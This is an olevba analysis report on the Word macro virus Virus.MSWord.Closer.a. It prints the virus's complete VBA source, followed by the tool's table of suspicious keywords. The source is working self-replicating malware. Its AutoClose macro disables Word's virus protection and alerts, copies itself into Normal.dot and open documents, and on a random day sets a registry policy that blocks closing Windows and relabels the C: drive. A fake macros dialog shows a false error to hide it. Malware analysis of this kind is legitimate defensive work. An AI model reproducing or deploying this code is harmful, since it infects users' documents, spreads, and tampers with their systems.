olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Closer.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Closer.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO noclose.bas 
in file: Virus.MSWord.Closer.a - OLE stream: 'Macros/VBA/noclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Randomize

With Application
    .ActiveDocument.ReadOnlyRecommended = False
    .DisplayAlerts = wdAlertsNone
    .EnableCancelKey = wdCancelDisabled
    .ScreenUpdating = False
    .ShowVisualBasicEditor = False
    .StatusBar = "WM97.NoClose -=[Jack Twoflower]=-"
End With
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
End With

Set ad = ActiveDocument.VBProject.VBComponents
Set nt = NormalTemplate.VBProject.VBComponents

z$ = "c:\windows\system\no32close.sys"
n$ = "noclose"

Application.VBE.ActiveVBProject.VBComponents(n$).Export z$

ai = 0
ni = 0

For i = 1 To nt.Count
    If nt(i).Name = n$ Then ni = 1
Next i

For i = 1 To ad.Count
    If ad(i).Name = n$ Then ai = 1
Next i

If ni = 0 Then nt.import z$: NormalTemplate.Save
If ai = 0 Then ad.import z$: ActiveDocument.Save

If Day(Now()) = Int((Rnd * 31) + 1) Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = "01"
    Shell ("label c: WM_NoClose"), vbHide
End If
End Sub

Sub ExtrasMakro()
Dim x

ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim DropListBox2__$(0)

DropListBox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
    WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
    WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
    WordBasic.PushButton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
    WordBasic.CancelButton 470, 38, 137, 21
    WordBasic.PushButton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
    WordBasic.PushButton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
    WordBasic.PushButton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
    WordBasic.PushButton 470, 154, 137, 21, "&Organisieren", "Definierbar6"
    WordBasic.PushButton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
    WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
    WordBasic.DropListBox 90, 196, 354, 19, DropListBox2__$(), "Listbox2"
    WordBasic.Text 7, 222, 109, 13, "Beschreibung:", "Text2"
    WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog
 
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
x = WordBasic.Dialog.UserDialog(dlg)
Select Case x
    Case 0
        WordBasic.Cancel
    Case 1 To 6
        WordBasic.MsgBox "Nicht genug Arbeitsspeicher! Schließen Sie eine oder mehrere Anwendungen!", "WordBasic Fehler=7", 48
End Select
End Sub
Sub AnsichtVBCode()
End Sub
Sub AnsichtCode()
End Sub
Sub FormatFormatvorlage()
End Sub
Sub DateiDokVorlage()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

